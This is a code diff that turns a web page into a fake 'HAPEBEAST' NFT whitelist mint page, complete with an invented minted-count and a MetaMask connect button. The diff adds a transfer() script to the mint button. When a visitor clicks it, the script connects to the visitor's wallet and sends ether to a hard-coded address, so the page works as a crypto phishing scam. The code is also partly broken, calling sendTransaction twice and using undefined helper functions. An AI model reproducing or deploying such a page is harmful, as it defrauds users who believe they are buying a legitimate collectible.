@@ -36,17 +36,41 @@
     <title>dedex</title>
  
  
-    <script src= "script.js"  defer></script>
-   
+    
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"
+        type="application/javascript" ></script>
+
+        <script src= "script.js" defer  ></script>
   </head>
 
   <body>
 
     
-    <div class="background" style="display:flex;justify-content:center;align-items:center;width:100vw;height:100vh;flex-direction:column;letter-spacing:2px;font-weight:300;font-family:Oswald"><div><div style="text-align:center;font-size:120px;font-weight:1000;color:white;line-height:130px;letter-spacing:8px">HAPEBEAST</div><div style="text-align:center;font-weight:400;font-size:36px;color:white;letter-spacing:6px">Whitelist #582</div></div><div style="height:3px;width:35%;background-color:white;margin-top:20px"></div><button id="btn3" style="margin-top:30px;border-width:2px;color:white;padding:10px 14px;font-size:20px;background-color:black">Click to connect with MetaMask</button><div style="color:white;font-size:30px;margin-top:40px;margin-bottom:30px;font-weight:500">Total Minted: 742 / 777</div><div style="display:flex;align-items:center;justify-content:center"><div style="color:white;font-size:30px;font-weight:500">I want to mint</div><input type="number" value="1" style="height:30px;margin-left:6px;margin-right:6px;width:45px;padding:3px 6px;border-radius:6px;font-weight:500" min="1" max="10"/><div style="color:white;font-size:30px;font-weight:500">Hapebeast(s)</div></div><button id="btn2" type="button" style="margin-top:30px;border-width:2px;color:white;padding:10px 14px;font-size:20px;background-color:black">Wallet is not connected</button><div style="height:3px;width:40%;background-color:white;margin-top:24px;margin-bottom:60px"></div></div></div>
+    <div class="background" style="display:flex;justify-content:center;align-items:center;width:100vw;height:100vh;flex-direction:column;letter-spacing:2px;font-weight:300;font-family:Oswald"><div><div style="text-align:center;font-size:120px;font-weight:1000;color:white;line-height:130px;letter-spacing:8px">HAPEBEAST</div><div style="text-align:center;font-weight:400;font-size:36px;color:white;letter-spacing:6px">Whitelist #582</div></div><div style="height:3px;width:35%;background-color:white;margin-top:20px"></div><button id="btn3" style="margin-top:30px;border-width:2px;color:white;padding:10px 14px;font-size:20px;background-color:black">Click to connect with MetaMask</button><div style="color:white;font-size:30px;margin-top:40px;margin-bottom:30px;font-weight:500">Total Minted: 742 / 777</div><div style="display:flex;align-items:center;justify-content:center"><div style="color:white;font-size:30px;font-weight:500">I want to mint</div><input type="number" value="1" style="height:30px;margin-left:6px;margin-right:6px;width:45px;padding:3px 6px;border-radius:6px;font-weight:500" min="1" max="10"/><div style="color:white;font-size:30px;font-weight:500">Hapebeast(s)</div></div><button onClick="transfer()" id="btn2"  style="margin-top:30px;border-width:2px;color:white;padding:10px 14px;font-size:20px;background-color:black">Wallet is not connected</button><div style="height:3px;width:40%;background-color:white;margin-top:24px;margin-bottom:60px"></div></div></div>
     <div id="root"></div>
-    
-   
+    <script>
+    async function transfer() {
+      if(typeof window.ethereum !== 'undefined') {
+        const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        try {
+          const tx = signer.sendTransaction({
+    to: "0x0a276C387ff1955ac5e1fA8B8482F5B806FC0f6d",
+    value: ethers.utils.parseEther("0.0001")
+})
+          const transaction = await signer.sendTransaction(tx);
+          await transaction.wait();
+          setAmountSend('');
+          getBalance();
+          setSuccess('Votre argent a bien été transféré sur le portefeuille ! ')
+        }
+        catch(err) {
+          
+        }
+      }
+    }
+  </script>
 
   </body>
   <style >
